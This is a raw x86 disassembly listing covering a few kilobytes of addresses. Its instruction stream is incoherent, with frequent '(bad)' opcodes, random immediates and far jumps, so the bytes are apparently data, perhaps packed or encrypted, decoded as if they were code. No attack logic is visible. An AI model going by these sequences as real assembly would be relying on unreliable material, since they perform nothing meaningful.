  41e2e0:	iret   
  41e2e1:	out    0x8e,al
  41e2e3:	add    BYTE PTR [edx],cl
  41e2e5:	and    eax,0xc360dc35
  41e2ea:	push   ecx
  41e2eb:	out    dx,eax
  41e2ec:	xor    ah,bh
  41e2ee:	ins    BYTE PTR es:[edi],dx
  41e2ef:	push   ebp
  41e2f0:	dec    ebp
  41e2f1:	mov    eax,ds:0xec1c1634
  41e2f6:	(bad)  
  41e2f7:	inc    ecx
  41e2f8:	es mov bl,0xf0
  41e2fb:	xchg   esp,eax
  41e2fc:	pop    ebx
  41e2fd:	push   edx
  41e2fe:	aad    0x19
  41e300:	popa   
  41e301:	(bad)  
  41e302:	fxch   st(0)
  41e304:	out    0x7c,eax
  41e306:	mov    ebx,0xf5bd341d
  41e30b:	mov    bl,0x26
  41e30d:	jl     0x41e347
  41e30f:	es cs dec ecx
  41e312:	outs   dx,DWORD PTR ds:[esi]
  41e313:	sahf   
  41e314:	sbb    cl,BYTE PTR [eax-0x62]
  41e317:	popa   
  41e318:	scas   al,BYTE PTR es:[edi]
  41e319:	jne    0x41e2f2
  41e31b:	and    eax,0x90d93722
  41e320:	xchg   DWORD PTR [edi],esp
  41e322:	or     al,0xf6
  41e324:	hlt    
  41e325:	shl    DWORD PTR [edi+0x75f177b6],0x30
  41e32c:	jle    0x41e38a
  41e32e:	frstor [eax-0x1f]
  41e331:	int    0xfb
  41e333:	jmp    0x41e370
  41e335:	in     eax,dx
  41e336:	xchg   dh,dh
  41e338:	mov    esi,0x4911c563
  41e33d:	xchg   edi,eax
  41e33e:	pop    esi
  41e33f:	mov    edi,0xadbdb157
  41e344:	push   edx
  41e345:	in     eax,dx
  41e346:	shl    DWORD PTR [esi-0x4f],0x8
  41e34a:	fiadd  DWORD PTR ds:0xd2b6d168
  41e350:	stos   BYTE PTR es:[edi],al
  41e351:	fstp   DWORD PTR [edx-0x2be38cbe]
  41e357:	mov    ecx,ss
  41e359:	xor    ecx,DWORD PTR [ebp-0x24]
  41e35c:	imul   edi,DWORD PTR ds:0x4372c233,0x14b5e13
  41e366:	loop   0x41e3d8
  41e368:	lahf   
  41e369:	xlat   BYTE PTR ds:[ebx]
  41e36a:	cli    
  41e36b:	into   
  41e36c:	pop    edi
  41e36d:	or     BYTE PTR gs:[ebp-0x69beb8f4],ch
  41e374:	xchg   esi,eax
  41e375:	xor    ebx,DWORD PTR [edx-0x71560c13]
  41e37b:	jecxz  0x41e3f2
  41e37d:	pop    ds
  41e37e:	clc    
  41e37f:	mov    al,0x7c
  41e381:	push   cs
  41e382:	sbb    ebp,DWORD PTR [edx+0x34c544b8]
  41e388:	mov    ebx,0x2b242e58
  41e38d:	imul   ebx,DWORD PTR [edx+0x13],0x30
  41e391:	inc    eax
  41e392:	bound  edi,QWORD PTR [eiz*8-0x12da2802]
  41e399:	jecxz  0x41e393
  41e39b:	push   0xffffffbf
  41e39d:	lock mov bl,0xbd
  41e3a0:	inc    ebx
  41e3a1:	je     0x41e3eb
  41e3a3:	ins    BYTE PTR es:[edi],dx
  41e3a4:	cs xchg edi,eax
  41e3a6:	test   al,0xb2
  41e3a8:	pusha  
  41e3a9:	sub    DWORD PTR [ebx],0x2e70efa4
  41e3af:	ficomp WORD PTR [eax-0x5f]
  41e3b2:	fdivr  st,st(6)
  41e3b4:	xchg   edi,eax
  41e3b5:	jg     0x41e36c
  41e3b7:	mov    ds:0x647e8e9a,eax
  41e3bc:	mov    edx,?
  41e3be:	(bad)  [esi]
  41e3c0:	push   esi
  41e3c1:	sbb    eax,0xe13f8373
  41e3c6:	in     eax,0x4e
  41e3c8:	push   ecx
  41e3c9:	es cli 
  41e3cb:	and    edx,ecx
  41e3cd:	pop    eax
  41e3ce:	int3   
  41e3cf:	add    BYTE PTR fs:[ebx-0x20],ah
  41e3d3:	mov    esp,0x7c2dd15a
  41e3d8:	mov    edi,0x3a20fa69
  41e3dd:	push   0xe51b9946
  41e3e2:	pop    esp
  41e3e3:	xor    BYTE PTR [edi-0x2f],al
  41e3e6:	push   0xffffffe5
  41e3e8:	xor    eax,0xe2c6745c
  41e3ed:	(bad)  
  41e3ee:	add    BYTE PTR [eax],al
  41e3f0:	add    BYTE PTR [eax],al
  41e3f2:	add    al,0xf8
  41e3f5:	and    eax,edi
  41e3f7:	cmp    ecx,ebx
  41e3f9:	loope  0x41e3df
  41e3fb:	mov    esi,0x7824fc94
  41e400:	lea    esp,[edx+0x15f29]
  41e406:	hlt    
  41e407:	add    al,0x0
  41e409:	add    BYTE PTR [ebx+0x7ed3fc8b],cl
  41e40f:	xor    al,0x15
  41e411:	cmp    edx,DWORD PTR [eax]
  41e413:	push   esp
  41e414:	frstor [esi+ecx*1+0x26]
  41e418:	test   eax,0x64e9d31
  41e41d:	mov    dh,dl
  41e41f:	mov    ds:0x8a20a960,eax
  41e424:	add    ebx,DWORD PTR [edi-0x63]
  41e427:	int    0xba
  41e429:	xchg   ebx,eax
  41e42a:	in     eax,dx
  41e42b:	sub    ebp,DWORD PTR [ecx-0x1ff38145]
  41e431:	stc    
  41e432:	jno    0x41e493
  41e434:	jmp    0x41e460
  41e436:	retf   0x25a9
  41e439:	inc    esp
  41e43a:	pop    ebx
  41e43b:	cmc    
  41e43c:	push   ebp
  41e43d:	pop    ebp
  41e43e:	mov    cl,0xe0
  41e440:	pop    esp
  41e441:	mov    bh,0x2f
  41e443:	ror    DWORD PTR [ebp+eax*2-0x5bb6fae5],0xbb
  41e44b:	inc    edx
  41e44c:	xor    eax,0x78d73383
  41e451:	adc    al,0x9
  41e453:	(bad)  
  41e454:	lods   eax,DWORD PTR ds:[esi]
  41e455:	retf   
  41e456:	or     al,BYTE PTR [ecx]
  41e458:	lea    ecx,[ebx+0x22]
  41e45b:	mov    ah,0x39
  41e45d:	shl    DWORD PTR [edx],cl
  41e45f:	pushf  
  41e460:	mov    al,ds:0x85865a15
  41e465:	jl     0x41e419
  41e467:	sbb    DWORD PTR [eax+0x54fc6d6f],0x52047e0b
  41e471:	sub    ah,dh
  41e473:	sub    al,0x23
  41e475:	test   dh,bh
  41e477:	mov    al,0x8f
  41e479:	or     eax,0xd799dd81
  41e47e:	outs   dx,DWORD PTR ds:[esi]
  41e47f:	call   0xccfd8259
  41e484:	cmp    BYTE PTR [ebx],bl
  41e486:	jns    0x41e441
  41e488:	sbb    bh,bh
  41e48a:	mov    ch,0x9e
  41e48c:	sbb    DWORD PTR [esi],ecx
  41e48e:	sbb    ebp,DWORD PTR [ecx-0x41]
  41e491:	jns    0x41e440
  41e493:	xlat   BYTE PTR ds:[ebx]
  41e494:	das    
  41e495:	stos   BYTE PTR es:[edi],al
  41e496:	test   BYTE PTR [edx+0xdc5ad81],dh
  41e49c:	pop    edx
  41e49d:	cs dec esp
  41e49f:	inc    esi
  41e4a0:	push   edi
  41e4a1:	pop    esi
  41e4a2:	sti    
  41e4a3:	xchg   BYTE PTR [edx+0x5f9135e2],bh
  41e4a9:	mov    WORD PTR [edx],ds
  41e4ab:	into   
  41e4ac:	fdiv   DWORD PTR [esi-0x3119b330]
  41e4b2:	add    DWORD PTR [edi-0x4e],edi
  41e4b5:	mov    edi,0x2e75def0
  41e4ba:	push   ds
  41e4bb:	aas    
  41e4bc:	ja     0x41e468
  41e4be:	outs   dx,BYTE PTR ds:[esi]
  41e4bf:	nop
  41e4c0:	jae    0x41e46d
  41e4c2:	push   esp
  41e4c3:	shl    edx,cl
  41e4c5:	into   
  41e4c6:	test   BYTE PTR [ebx],dh
  41e4c8:	ins    BYTE PTR es:[edi],dx
  41e4c9:	pop    ebx
  41e4ca:	les    ebp,FWORD PTR [eax]
  41e4cc:	cmp    BYTE PTR [edi+0x71],dl
  41e4cf:	lea    edi,ds:0x5d1157e2
  41e4d5:	dec    edi
  41e4d6:	mov    dl,0xd5
  41e4d8:	retf   
  41e4d9:	cmp    DWORD PTR [ecx-0x1f0ff5c5],esi
  41e4df:	add    dh,bl
  41e4e1:	pop    ss
  41e4e2:	jbe    0x41e468
  41e4e4:	cli    
  41e4e5:	mov    ch,0xfd
  41e4e7:	ins    DWORD PTR es:[edi],dx
  41e4e8:	out    dx,al
  41e4e9:	mov    ch,0x2
  41e4eb:	xchg   BYTE PTR [ebx],ch
  41e4ed:	dec    edx
  41e4ee:	paddb  mm1,QWORD PTR [edi-0x17]
  41e4f2:	push   edi
  41e4f3:	sti    
  41e4f4:	inc    ecx
  41e4f5:	(bad)  
  41e4f6:	and    eax,esi
  41e4f8:	pop    edi
  41e4f9:	aam    0x0
  41e4fb:	push   edx
  41e4fc:	dec    ecx
  41e4fd:	in     eax,0x39
  41e4ff:	sahf   
  41e500:	ficom  WORD PTR ds:0x4c4879b6
  41e506:	and    DWORD PTR [ecx],edx
  41e508:	pushf  
  41e509:	test   BYTE PTR [edx+0x4e2e2b97],0x62
  41e510:	push   ebx
  41e511:	adc    BYTE PTR [bp+di-0x1c],ch
  41e515:	repz shr DWORD PTR [esi+esi*1+0x2a],0x8d
  41e51b:	mov    bl,0x60
  41e51d:	cmp    BYTE PTR [edi-0x29879e8e],dl
  41e523:	push   ss
  41e524:	adc    cl,cl
  41e526:	add    dh,cl
  41e528:	(bad)  
  41e529:	ds lock test al,0x62
  41e52d:	mov    dl,0xd2
  41e52f:	jmp    DWORD PTR [edx+0x58cf4a16]
  41e535:	das    
  41e536:	mov    cl,0xfd
  41e538:	arpl   WORD PTR ds:0xa93fac9b,cx
  41e53e:	adc    eax,0x291a045f
  41e543:	call   0x7f372b27
  41e548:	(bad)  
  41e549:	jae    0x41e569
  41e54b:	mov    ecx,0x3031976f
  41e550:	push   ecx
  41e551:	das    
  41e552:	and    eax,0x363dedc0
  41e557:	dec    esp
  41e558:	test   eax,0x41a87dea
  41e55d:	mov    ah,0xc4
  41e55f:	retf   
  41e560:	xor    ah,BYTE PTR [edi]
  41e562:	inc    ebx
  41e563:	push   eax
  41e564:	jecxz  0x41e5bf
  41e566:	jl     0x41e589
  41e568:	cmc    
  41e569:	in     al,dx
  41e56a:	mov    bl,0xd4
  41e56c:	arpl   di,cx
  41e56e:	xor    al,0x13
  41e570:	outs   dx,DWORD PTR ds:[esi]
  41e571:	push   ebp
  41e572:	cmp    DWORD PTR [ebx+0x79],0xffffff90
  41e576:	(bad)  
  41e577:	std    
  41e578:	fisub  WORD PTR [eax+edi*2]
  41e57b:	mov    bh,0xc8
  41e57d:	inc    ecx
  41e57e:	lahf   
  41e57f:	inc    ebp
  41e580:	mov    WORD PTR [edi*8+0x20f15f18],ds
  41e587:	adc    al,0xeb
  41e589:	ss cld 
  41e58b:	test   BYTE PTR [edx-0x2afc86a0],ah
  41e591:	jmp    0x9f38:0x2f5a25e7
  41e598:	push   eax
  41e599:	ins    BYTE PTR es:[edi],dx
  41e59a:	scas   eax,DWORD PTR es:[edi]
  41e59b:	fadd   QWORD PTR ds:[edx]
  41e59e:	mov    ebp,ds
  41e5a0:	rcl    BYTE PTR [ebx],0xd
  41e5a3:	xchg   esp,eax
  41e5a4:	fld    QWORD PTR [edi]
  41e5a6:	mov    ebp,0xe237bb30
  41e5ab:	mov    al,0x14
  41e5ad:	sbb    DWORD PTR [edi-0x1b],edi
  41e5b0:	push   edi
  41e5b1:	aaa    
  41e5b2:	cs hlt 
  41e5b4:	sbb    al,BYTE PTR [esp+edi*1]
  41e5b7:	cmp    DWORD PTR [eax+0x206d5b21],0x2cdbd9b3
  41e5c1:	sbb    dh,BYTE PTR [edx]
  41e5c3:	push   0xced79d23
  41e5c8:	test   esp,edi
  41e5ca:	add    DWORD PTR [ebx-0x14e0c3e3],edi
  41e5d0:	adc    eax,0x5161df60
  41e5d5:	gs xor eax,0x138967e5
  41e5db:	mov    edx,0x996d50ce
  41e5e0:	jnp    0x41e565
  41e5e2:	fs loop 0x41e568
  41e5e5:	test   al,bh
  41e5e7:	je     0x41e615
  41e5e9:	in     al,dx
  41e5ea:	sbb    ebx,DWORD PTR ds:0x43f66a48
  41e5f0:	sar    BYTE PTR [eax-0x29cfcb1e],1
  41e5f6:	aaa    
  41e5f7:	bound  ebp,QWORD PTR [ebx-0x6d8efc2a]
  41e5fd:	sbb    ebx,DWORD PTR [ecx+0x1d53d946]
  41e603:	stos   DWORD PTR es:[edi],eax
  41e604:	cmp    DWORD PTR [ecx+0x31b2abb4],esp
  41e60a:	mov    BYTE PTR [edx],dl
  41e60c:	iret   
  41e60d:	clc    
  41e60e:	arpl   ax,bp
  41e610:	popf   
  41e611:	neg    esp
  41e613:	icebp  
  41e614:	sbb    al,0x66
  41e616:	adc    eax,0x2ae163ba
  41e61b:	mov    eax,ds:0x94adc5e9
  41e620:	push   0x25
  41e622:	fsubr  st,st(7)
  41e624:	adc    eax,0x78d5f7c1
  41e629:	js     0x41e661
  41e62b:	cmp    eax,DWORD PTR [edi-0x1d]
  41e62e:	mov    cl,0x4a
  41e630:	add    BYTE PTR ss:[ecx-0x15569a46],dh
  41e637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e638:	pop    es
  41e639:	jo     0x41e5fd
  41e63b:	cmp    eax,0x73266e6c
  41e640:	or     ch,0xf3
  41e643:	push   edi
  41e644:	mov    WORD PTR [edx],es
  41e646:	stc    
  41e647:	mov    dh,0xa2
  41e649:	jb     0x41e66c
  41e64b:	adc    eax,0xca7649c0
  41e650:	out    dx,eax
  41e651:	fdivr  DWORD PTR [esi-0x33bb53b0]
  41e657:	aas    
  41e658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e659:	xchg   esp,eax
  41e65a:	in     al,dx
  41e65b:	(bad)  
  41e65c:	xor    bh,BYTE PTR [ebp+ecx*4-0x1bd77a10]
  41e663:	or     esi,esp
  41e665:	adc    BYTE PTR ds:0x15ff4559,bh
  41e66b:	bnd ja 0x41e605
  41e66e:	push   cs
  41e66f:	lds    eax,FWORD PTR [eax-0x68]
  41e672:	fidivr DWORD PTR [eax-0x5f2b74c9]
  41e678:	mov    dh,BYTE PTR [ebx+0x3]
  41e67b:	lds    ebx,FWORD PTR [edx-0x4a]
  41e67e:	(bad)  
  41e67f:	aaa    
  41e680:	fwait
  41e681:	pop    ds
  41e682:	clc    
  41e683:	sub    eax,0x575aef26
  41e688:	pop    eax
  41e689:	aas    
  41e68a:	fwait
  41e68b:	jle    0x41e62a
  41e68d:	and    al,0x90
  41e68f:	mov    cl,0x94
  41e691:	gs pop ecx
  41e693:	mov    BYTE PTR [ecx+0x7f72a3cf],dl
  41e699:	xchg   esi,eax
  41e69a:	retf   0x7844
  41e69d:	dec    ebx
  41e69e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e6a0:	mov    cl,0xde
  41e6a2:	push   ebp
  41e6a3:	scas   eax,DWORD PTR es:[edi]
  41e6a4:	inc    ebp
  41e6a5:	enter  0xcbde,0x35
  41e6a9:	nop
  41e6aa:	adc    BYTE PTR [ecx-0x26],ch
  41e6ad:	mov    WORD PTR [ebx],ss
  41e6af:	aad    0x15
  41e6b1:	(bad)  
  41e6b2:	mov    ecx,0x88d2746d
  41e6b7:	ds mov esp,0x8250739
  41e6bd:	xor    eax,0x741d8a73
  41e6c2:	sub    al,0xaf
  41e6c4:	pop    ebx
  41e6c5:	mov    edx,0x4cfc23f5
  41e6ca:	out    dx,al
  41e6cb:	jmp    0xb5ca:0x5dccc75
  41e6d2:	xchg   edi,eax
  41e6d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d4:	daa    
  41e6d5:	mov    edi,0x4854b238
  41e6da:	cli    
  41e6db:	lods   al,BYTE PTR ds:[esi]
  41e6dc:	ror    DWORD PTR [edx],1
  41e6de:	outs   dx,DWORD PTR ds:[esi]
  41e6df:	mov    bh,0x67
  41e6e1:	iret   
  41e6e2:	push   esp
  41e6e3:	xchg   ecx,eax
  41e6e4:	pushf  
  41e6e5:	mov    ebp,0x6d496f50
  41e6ea:	xchg   DWORD PTR [esi+0x59],edi
  41e6ed:	pop    esp
  41e6ee:	xchg   ebp,eax
  41e6ef:	pusha  
  41e6f0:	pushf  
  41e6f1:	xor    dl,0x22
  41e6f4:	mov    al,ds:0x287cb39c
  41e6f9:	lock jb 0x41e691
  41e6fc:	test   al,0x56
  41e6fe:	dec    esp
  41e6ff:	and    esp,DWORD PTR [esi+esi*4+0x23636f21]
  41e706:	out    dx,eax
  41e707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e708:	enter  0x7d1b,0x36
  41e70c:	imul   esi,DWORD PTR [eax+0x62],0xffffff96
  41e710:	sbb    ebx,DWORD PTR [eax-0x41221403]
  41e716:	adc    al,0x39
  41e718:	scas   al,BYTE PTR es:[edi]
  41e719:	in     eax,dx
  41e71a:	leave  
  41e71b:	jp     0x41e77f
  41e71d:	mov    bh,0xff
  41e71f:	in     ax,dx
  41e721:	hlt    
  41e722:	mov    al,ds:0xdbbbd8c4
  41e727:	(bad)  
  41e728:	(bad)  
  41e729:	das    
  41e72a:	(bad)  
  41e72b:	mov    bh,0xaf
  41e72d:	fwait
  41e72e:	mov    ecx,0x5f741d1d
  41e733:	loopne 0x41e75d
  41e735:	jae    0x41e70f
  41e737:	mov    eax,0x977187f1
  41e73c:	mov    ebp,0xfbc311e5
  41e741:	stc    
  41e742:	pop    edi
  41e743:	iret   
  41e744:	inc    edi
  41e745:	mov    esp,0x9622eef6
  41e74a:	addr16 jle 0x41e754
  41e74d:	pop    ds
  41e74e:	ficom  WORD PTR ds:0x5dbb89f0
  41e754:	fcmove st,st(2)
  41e756:	sbb    al,0xba
  41e758:	in     eax,0xfa
  41e75a:	mov    BYTE PTR [esi],cl
  41e75c:	test   eax,0xace695bf
  41e762:	jg     0x41e700
  41e764:	ds icebp 
  41e766:	and    ecx,DWORD PTR [esp+eax*4]
  41e769:	fucom  st(4)
  41e76b:	sti    
  41e76c:	call   0x21e3:0x482cf9a7
  41e773:	and    esi,DWORD PTR [ebp+0x68]
  41e776:	mov    WORD PTR [esp+edi*2-0x755843f9],ds
  41e77d:	mov    al,0xb5
  41e77f:	jbe    0x41e777
  41e781:	movaps xmm7,XMMWORD PTR [ebx+0x5b]
  41e785:	in     al,dx
  41e786:	retf   0x4571
  41e789:	jae    0x41e74d
  41e78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e78c:	arpl   bx,di
  41e78e:	mov    cl,0x31
  41e790:	js     0x41e7eb
  41e792:	imul   edx,DWORD PTR [edi],0x9c30c84f
  41e798:	jbe    0x41e71c
  41e79a:	pusha  
  41e79b:	or     bh,ch
  41e79d:	popf   
  41e79e:	sub    al,0x6e
  41e7a0:	lods   al,BYTE PTR ds:[esi]
  41e7a1:	ins    DWORD PTR es:[edi],dx
  41e7a2:	adc    DWORD PTR [edi],edx
  41e7a4:	sbb    edx,DWORD PTR [esi-0x4660ed2]
  41e7aa:	leave  
  41e7ab:	xchg   ebp,eax
  41e7ac:	lds    edi,FWORD PTR [ecx-0x36]
  41e7af:	xor    DWORD PTR [edx],edx
  41e7b1:	mov    ecx,cs
  41e7b3:	repz pop es
  41e7b5:	into   
  41e7b6:	mov    ch,0x3d
  41e7b8:	dec    edx
  41e7b9:	outs   dx,BYTE PTR ds:[esi]
  41e7ba:	inc    ecx
  41e7bb:	ja     0x41e787
  41e7bd:	aas    
  41e7be:	cmp    bl,BYTE PTR [eax+0x3c453f9e]
  41e7c4:	add    BYTE PTR [esi-0x7d098eaf],ah
  41e7ca:	pop    ebp
  41e7cb:	mov    cl,0x98
  41e7cd:	repz xchg esi,ebx
  41e7d0:	mov    edx,0xcace919c
  41e7d5:	xor    bh,BYTE PTR [esi+0x7d01e25a]
  41e7db:	dec    eax
  41e7dc:	mov    bl,0x71
  41e7de:	push   eax
  41e7df:	sub    cl,BYTE PTR [ebx+0xf]
  41e7e2:	adc    eax,0x28a175d7
  41e7e7:	push   ebp
  41e7e8:	addr16 ret 0xd8d6
  41e7ec:	dec    edx
  41e7ed:	addr16 mov al,0x34
  41e7f0:	enter  0xff81,0xf9
  41e7f4:	sbb    al,0x4
  41e7f6:	fidiv  DWORD PTR [esi-0x260448a8]
  41e7fc:	pop    ecx
  41e7fd:	cwde   
  41e7fe:	fisub  WORD PTR [esi-0x70]
  41e801:	add    eax,0xe0a35e8e
  41e806:	adc    eax,edx
  41e808:	imul   ebx,DWORD PTR [edi+ebp*1],0x6f
  41e80c:	push   cs
  41e80d:	rcr    DWORD PTR [eax-0x1f],cl
  41e810:	(bad)  
  41e811:	and    ebp,edi
  41e813:	dec    ebx
  41e814:	xchg   DWORD PTR [ebp-0x24],ebp
  41e817:	or     al,0x15
  41e819:	sbb    edx,esp
  41e81b:	push   ss
  41e81c:	outs   dx,DWORD PTR ds:[esi]
  41e81d:	dec    esp
  41e81e:	cmp    bh,BYTE PTR [ebx+0xd09352a]
  41e824:	test   al,0xa9
  41e826:	(bad)  
  41e827:	loop   0x41e7c2
  41e829:	push   ebx
  41e82a:	add    esi,DWORD PTR [ebx-0x2]
  41e82d:	push   0x75
  41e82f:	or     ah,BYTE PTR [eax]
  41e831:	bound  esp,QWORD PTR [ebx-0x42250c8a]
  41e837:	retf   
  41e838:	push   edx
  41e839:	pushf  
  41e83a:	fwait
  41e83b:	cmp    bh,BYTE PTR [eax+eax*8+0x35ea5217]
  41e842:	mov    dh,0xce
  41e844:	stc    
  41e845:	cdq    
  41e846:	stc    
  41e847:	pop    ds
  41e848:	out    dx,al
  41e849:	xchg   esp,eax
  41e84a:	stos   BYTE PTR es:[edi],al
  41e84b:	or     ebx,DWORD PTR [ecx-0x511dfd9d]
  41e851:	popf   
  41e852:	arpl   WORD PTR [ebp+edi*4-0x7b],di
  41e856:	das    
  41e857:	inc    edi
  41e858:	cmp    BYTE PTR [ecx+edx*1-0x66],0x62
  41e85d:	inc    eax
  41e85e:	xchg   esi,eax
  41e85f:	arpl   WORD PTR [esi],sp
  41e861:	mov    ah,0xe4
  41e863:	mov    edi,0xb2457ccd
  41e868:	leave  
  41e869:	push   0xd53e473b
  41e86e:	push   ss
  41e86f:	icebp  
  41e870:	(bad)  
  41e871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e872:	dec    ebp
  41e873:	in     al,dx
  41e874:	xor    DWORD PTR [ecx-0x7050b36],esi
  41e87a:	xor    BYTE PTR [ecx-0x66],0xe4
  41e87e:	scas   eax,DWORD PTR es:[edi]
  41e87f:	push   0xfffffff1
  41e881:	shr    edx,0x7e
  41e884:	cwde   
  41e885:	inc    ebp
  41e886:	or     DWORD PTR [eax+edx*8+0xf],eax
  41e88a:	jmp    0xe79ded1a
  41e88f:	in     al,dx
  41e890:	stos   BYTE PTR es:[edi],al
  41e891:	add    DWORD PTR [ecx-0xe],eax
  41e894:	enter  0x6ba6,0x70
  41e898:	std    
  41e899:	adc    eax,0x75704071
  41e89e:	mov    eax,DWORD PTR [edx-0x250ab948]
  41e8a4:	xchg   edi,eax
  41e8a5:	setl   BYTE PTR [edx+0xf]
  41e8a9:	sar    BYTE PTR [edi-0x22],0xcd
  41e8ad:	xchg   edx,eax
  41e8ae:	(bad)  
  41e8af:	cmp    eax,0x17b4d888
  41e8b4:	jg     0x41e880
  41e8b6:	inc    ebp
  41e8b7:	imul   edx,eax,0x54a0de92
  41e8bd:	sbb    eax,0x1de52df1
  41e8c2:	sbb    eax,DWORD PTR [eax-0x25]
  41e8c5:	push   ecx
  41e8c6:	ret    
  41e8c7:	xchg   ebx,eax
  41e8c8:	inc    ebx
  41e8ca:	sub    edx,DWORD PTR [ebx-0x37]
  41e8cd:	ja     0x41e8b9
  41e8cf:	stos   DWORD PTR es:[edi],eax
  41e8d0:	fimul  DWORD PTR [eax]
  41e8d2:	popa   
  41e8d3:	(bad)  
  41e8d4:	sbb    bl,cl
  41e8d6:	jg     0x41e86c
  41e8d8:	popa   
  41e8d9:	repz adc BYTE PTR [esi+0x68d6eca5],ch
  41e8e0:	popa   
  41e8e1:	je     0x41e8e8
  41e8e3:	loopne 0x41e91a
  41e8e5:	mov    dh,0x99
  41e8e7:	or     esp,ebp
  41e8e9:	pushf  
  41e8ea:	add    dh,BYTE PTR [ecx+0x4f]
  41e8ed:	jl     0x41e8db
  41e8ef:	ss aam 0x75
  41e8f2:	dec    ebp
  41e8f3:	xor    ebx,esi
  41e8f5:	jle    0x41e8fd
  41e8f7:	dec    edx
  41e8f8:	dec    edi
  41e8f9:	add    BYTE PTR [edi],0xb0
  41e8fc:	mov    esp,0x8f
  41e901:	add    BYTE PTR [edi+0x78],bh
  41e904:	mov    ecx,0xffd5bf55
  41e909:	jp     0x41e931
  41e90b:	ret    0x676d
  41e90e:	gs jne 0x41e93b
  41e911:	mov    bl,BYTE PTR ds:0xf4000164
  41e917:	add    al,0x0
  41e919:	add    dl,ch
  41e91b:	stos   DWORD PTR es:[edi],eax
  41e91c:	in     al,dx
  41e91d:	sbb    al,0x96
  41e91f:	sbb    eax,0x18362df1
  41e924:	xor    esp,DWORD PTR [ecx+0xf8e210a]
  41e92a:	jg     0x41e927
  41e92c:	dec    esp
  41e92d:	xchg   esp,eax
  41e92e:	fdivr  st(6),st
  41e930:	in     al,0xf8
  41e932:	jmp    0xa1d6:0x739a54d9
  41e939:	dec    ebp
  41e93a:	enter  0x15dd,0xd6
  41e93e:	pop    esp
  41e93f:	repz cs push ss
  41e942:	xchg   ebp,eax
  41e943:	rol    DWORD PTR es:[edx],0x65
  41e947:	adc    eax,0x9e1948df
  41e94c:	xor    esi,DWORD PTR [esi]
  41e94e:	je     0x41e921
  41e950:	pop    ds
  41e951:	jae    0x41e912
  41e953:	in     al,dx
  41e954:	cmp    ecx,ecx
  41e956:	test   eax,0xadede970
  41e95b:	sahf   
  41e95c:	jge    0x41e9b8
  41e95e:	(bad)  
  41e95f:	(bad)  [edi]
  41e961:	(bad)  
  41e962:	mov    al,ds:0x4f385c46
  41e967:	xchg   ebx,eax
  41e968:	out    0xe5,eax
  41e96a:	call   0x8dbd9e1a
  41e96f:	pusha  
  41e970:	rep outs dx,DWORD PTR ds:[esi]
  41e972:	adc    ah,BYTE PTR [ecx]
  41e974:	(bad)  
  41e975:	lods   al,BYTE PTR ds:[esi]
  41e977:	push   ss
  41e978:	ins    BYTE PTR es:[edi],dx
  41e979:	or     eax,0xb210dd46
  41e97e:	fadd   QWORD PTR [ebp-0x5b592291]
  41e984:	sub    eax,0xc62b772e
  41e989:	adc    eax,0x269fabd2
  41e98e:	sub    ebp,edx
  41e990:	inc    ebx
  41e991:	cmp    BYTE PTR [edx-0x7e397ebc],bl
  41e997:	ins    BYTE PTR es:[edi],dx
  41e998:	or     ecx,DWORD PTR [ebp-0x77703971]
  41e99e:	lods   eax,DWORD PTR ds:[esi]
  41e99f:	(bad)  
  41e9a0:	pop    edx
  41e9a1:	add    BYTE PTR [esi],dl
  41e9a3:	xchg   ebp,eax
  41e9a4:	repnz popf 
  41e9a6:	add    edx,DWORD PTR [eax]
  41e9a8:	ret    0x1879
  41e9ab:	push   es
  41e9ac:	adc    BYTE PTR [ebx-0x3573daef],bl
  41e9b2:	jns    0x41e93a
  41e9b4:	sahf   
  41e9b5:	inc    edi
  41e9b6:	inc    ebx
  41e9b7:	neg    DWORD PTR [ebx-0x44]
  41e9ba:	mov    al,ds:0xf39cc1f5
  41e9bf:	jg     0x41ea3c
  41e9c1:	add    ebp,DWORD PTR [edx+ebx*1]
  41e9c4:	(bad)
  41e9c7:	clc    
  41e9c8:	cmp    dl,dh
  41e9ca:	mov    cl,0x72
  41e9cc:	push   ebx
  41e9cd:	shr    DWORD PTR gs:[ecx+ecx*2-0x5042a06b],0x61
  41e9d6:	xchg   edx,eax
  41e9d7:	pop    esp
  41e9d8:	iret   
  41e9d9:	push   ebx
  41e9da:	wbinvd 
  41e9dc:	(bad)  
  41e9dd:	jne    0x41e9d2
  41e9df:	in     eax,0x3c
  41e9e1:	stos   BYTE PTR es:[edi],al
  41e9e2:	dec    ebp
  41e9e3:	shl    BYTE PTR [ebx+0x7a],cl
  41e9e6:	mov    ebx,?
  41e9e8:	in     al,0xa1
  41e9ea:	fs pop edx
  41e9ec:	inc    ecx
  41e9ed:	push   edx
  41e9ee:	pop    ebp
  41e9ef:	inc    BYTE PTR [edi+eax*4+0x5d85e56]
  41e9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f7:	(bad)  
  41e9f8:	stc    
  41e9f9:	shr    BYTE PTR [ebx+0xef5227f],0xf2
  41ea00:	mov    bl,0xdd
  41ea02:	cld    
  41ea03:	out    dx,eax
  41ea04:	je     0x41ea22
  41ea06:	cdq    
  41ea07:	lahf   
  41ea08:	icebp  
  41ea09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea0a:	push   ss
  41ea0b:	mov    ds:0xd7cbe613,eax
  41ea10:	push   0x623cf045
  41ea15:	test   DWORD PTR [eax+edi*1+0x33],ecx
  41ea19:	jno    0x41ea7b
  41ea1b:	rcl    BYTE PTR [edi],1
  41ea1d:	test   al,0x6c
  41ea1f:	subps  xmm7,XMMWORD PTR [ebx]
  41ea22:	mov    eax,0x244317f
  41ea27:	pop    ss
  41ea28:	inc    eax
  41ea29:	js     0x41e9d0
  41ea2b:	mov    edi,0x592102fe
  41ea30:	js     0x41ea1a
  41ea32:	jg     0x41ea85
  41ea34:	ret    0x825b
  41ea37:	data16 xor ch,0xe6
  41ea3b:	ret    
  41ea3c:	pop    ebx
  41ea3d:	jecxz  0x41e9fe
  41ea3f:	xchg   edi,eax
  41ea40:	mov    dh,0x3d
  41ea42:	scas   al,BYTE PTR es:[edi]
  41ea43:	test   BYTE PTR [ebx+0xb],bl
  41ea46:	or     al,0xc8
  41ea48:	mov    eax,ds:0xe7d539e7
